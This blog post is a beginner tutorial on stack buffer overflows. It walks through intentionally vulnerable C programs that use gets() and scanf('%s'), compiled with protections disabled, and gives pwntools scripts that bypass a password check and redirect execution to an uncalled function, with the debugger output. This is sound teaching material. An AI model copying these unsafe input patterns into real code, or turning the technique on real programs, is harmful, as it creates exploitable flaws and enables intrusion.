---
author: pl4int3xt
layout: post
title: Buffer overfl0w 01
date: '2024-01-05'
# cover: img/cover_images/50.png
description: "Learn about the basics of buffer overflow and some of the exploitation techniques"
categories: [Binary Exploitation 101]
tags: [Buffer overflow, binary exploitation]
---

## Understanding buffer overflow
Buffer overflow occurs when a running program tries to write data outside the memory buffer. A buffer is temporary storage usually present in the physical memory used to hold data. A buffer overflow may lead a program to crash or execute other malicious code.

## Let's take a look of a basic authetication program.

```c
#include <stdio.h>
#include <string.h>

int main(void)
{
    char password[6];
    int authorised = 0;

    printf("Enter admin password: \n");
    gets(password);

    if(strcmp(password, "pass") == 0){
        printf("Correct Password!\n");
        authorised = 1;
    } else {
        printf("Incorrect Password!\n");
    }

    if(authorised) {
        printf("Successfully logged in as Admin (authorised=%d) :)\n", authorised);
    }else{
		printf("Failed to log in as Admin (authorised=%d) :(\n", authorised);
	}

    return 0;
}
```

Let's compile the code to an executable binary and remove the protections which might prevent us from exploiting the code. The code is dynamically linked and its not stripped.

```shell
gcc login.c -o login -fno-stack-protector -z execstack -no-pie
```
We enter a random password and we get incorrect password and we failed to login as Admin
```shell
~/Documents/coding/c$ ./login
Enter admin password: 
12313
Incorrect Password!
Failed to log in as Admin (authorised=0) :(
```
## 0verwriting local variables in the stack
Let's try entering a long random data and see what's happens
```shell
~/Documents/coding/c$ ./login
Enter admin password: 
abcdefg
Incorrect Password!
Successfully logged in as Admin (authorised=103) :)
```
We successfully logged in with a wrong password.The authorised variable is set to 103  which is the decimal value of the ascii character g. Our character from the code should only hold a maximum of 6 characters.

```c
char password[6];
```

Since we are using a dangerous method `gets()` it does not check whether the user input will fit inside the 6 byte `char[]`. Since the authorised variable is below the password array in the stack it will be the one that will be overwritten first after the buffer of 6 characters if filled. 
```c
char password[6];
int authorised = 0;
```
The if condition checks if authorised is not equal to zero and since it was overwritten to 103 it will return true and hence we will log in successfully without the correct password
```c
if(authorised) {
    printf("Successfully logged in as Admin (authorised=%d) :)\n", authorised);
}else{
	printf("Failed to log in as Admin (authorised=%d) :(\n", authorised);
}
```
Let's try using a pwn script to exploit this code
```python
from pwn import *

# execute the program locally
io = process('./login')

# debug the program and see whats being send and received 
context.log_level = "debug"

# send our string to overflow the buffer after the last colon Enter admin password:
io.sendlineafter(b':', b'abcdefg')

# Receive the output from the program
print(io.recvall().decode())

```
Let's run the script and automatically exploit the buffer overflow
```shell
~/Documents/coding/c$ python3 buffer.py
[+] Starting local process './login': pid 33611
[DEBUG] Received 0x17 bytes:
    b'Enter admin password: \n'
[DEBUG] Sent 0x8 bytes:
    b'abcdefg\n'
[+] Receiving all data: Done (74B)
[*] Process './login' stopped with exit code 0 (pid 33611)
[DEBUG] Received 0x48 bytes:
    b'Incorrect Password!\n'
    b'Successfully logged in as Admin (authorised=103) :)\n'
 
Incorrect Password!
Successfully logged in as Admin (authorised=103) :)
```
We can see we successfully logged in as Admin. The pwntools will come in handy when exploiting binaries running remotely which will happen in most cases during pwn challenges.

## The unreachable functi0n W4TCHD0G5

In the following code the watchdogs function cannot be executed by the program since there is no place in the code where it is called.
```c
#include <stdio.h>

void watchdogs(){
    printf("Let's play W4tchd0g5");
}

void register_favourite_game(){
    char buffer[16];

    printf("Enter your favourite video game :\n");
    scanf("%s", buffer);
    printf("Your favourite video games is , %s\n", buffer);    
}

int main(){
    register_favourite_game();

    return 0;
}
```
Again Let's compile the code to an executable binary and remove the protections which might prevent us from exploiting the code. The code is dynamically linked and its not stripped.

```shell
gcc watchdogs.c -o watchdogs -fno-stack-protector -z execstack -no-pie
```
Let's run the program and input our favourite game
```shell
~/Documents/coding/c$ ./watchdogs
Enter your favourite video game :
Fortnite
Your favourite video games is , Fortnite
```
Let's run the program and input a long character greater than 16 characters
```
~/Documents/coding/c$ ./watchdogs
Enter your favourite video game :
dafgshkjdljkewucywklbecrtktwveuityikwrntuicw
Your favourite video games is , dafgshkjdljkewucywklbecrtktwveuityikwrntuicw
Segmentation fault (core dumped)
```
we get a segmentation fault meaning maybe we have overwritten some important variables of the code or the return address. Let's get the (offset) number of characters we need to write before overwritting the return address using pwndbg. We first use cyclic to generate 50 random characters

```shell
~/Documents/coding/c$ pwndbg watchdogs
Reading symbols from watchdogs...
(No debugging symbols found in watchdogs)
Cannot convert between character sets `UTF-32' and `UTF-8'
pwndbg: loaded 147 pwndbg commands and 46 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
------- tip of the day (disable with set show-tips off) -------
break-if-taken and break-if-not-taken commands sets breakpoints after a given jump instruction was taken or not
pwndbg> cyclic 50
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
```
We then run the program and enter the values we got from cyclic
```shell
pwndbg> run
Starting program: /home/pl4int3xt/Documents/coding/c/watchdogs 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter your favourite video game :
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
```
The executable with crash and we will be able to see this as part of the REGISTERS output
```shell
*R13  0x7fffffffdf58 —▸ 0x7fffffffe2d1 ◂— 'SHELL=/bin/bash'
*R14  0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401110 (__do_global_dtors_aux) ◂— endbr64 
*R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2d0 ◂— 0x0
*RBP  0x6161616161616163 ('caaaaaaa')
*RSP  0x7fffffffde28 ◂— 'daaaaaaaeaaaaaaafaaaaaaaga'
*RIP  0x4011b3 (register_favourite_game+83) ◂— ret 
```
since this is a 64bit binary we need to get the first 8 values of RSP `daaaaaaa` since they are the characters which would have made it to the RIP. We use cyclic to lookup the characters
```shell
pwndbg> cyclic -l daaaaaaa
Finding cyclic pattern of 8 bytes: b'daaaaaaa' (hex: 0x6461616161616161)
Found at offset 24
```
We will put 24 random characters before overwriting the return address. Let's create a python script to automate this
```python
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Set up pwntools for the correct architecture
exe = './watchdogs'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# Start the executable
io = start()

# How many bytes to the instruction pointer (RIP)?
padding = 24

payload = flat(
    b'A' * 24,
    elf.functions.watchdogs  # 0x00401146
)

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter(b':', payload)

# Receive the flag
io.interactive()
```
Let's run the code and see the output
```shell
~/Documents/coding/c$ python3 watchdogs.py
[+] Starting local process './watchdogs': pid 48776
[DEBUG] Received 0x22 bytes:
    b'Enter your favourite video game :\n'
[DEBUG] Sent 0x21 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  46 11 40 00  00 00 00 00  │AAAA│AAAA│F·@·│····│
    00000020  0a                                                  │·│
    00000021
[*] Switching to interactive mode

[DEBUG] Received 0x53 bytes:
    00000000  59 6f 75 72  20 66 61 76  6f 75 72 69  74 65 20 76  │Your│ fav│ouri│te v│
    00000010  69 64 65 6f  20 67 61 6d  65 73 20 69  73 20 2c 20  │ideo│ gam│es i│s , │
    00000020  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000030  41 41 41 41  41 41 41 41  46 11 40 0a  4c 65 74 27  │AAAA│AAAA│F·@·│Let'│
    00000040  73 20 70 6c  61 79 20 57  34 74 63 68  64 30 67 35  │s pl│ay W│4tch│d0g5│
    00000050  3a 4f 0a                                            │:O·│
    00000053
Your favourite video games is , AAAAAAAAAAAAAAAAAAAAAAAAF\x11@
Let's play W4tchd0g5
[*] Got EOF while reading in interactive
$ 
[*] Process './watchdogs' stopped with exit code -11 (SIGSEGV) (pid 48776)
```
We were able to execute our unreachable function W4TCHD0G5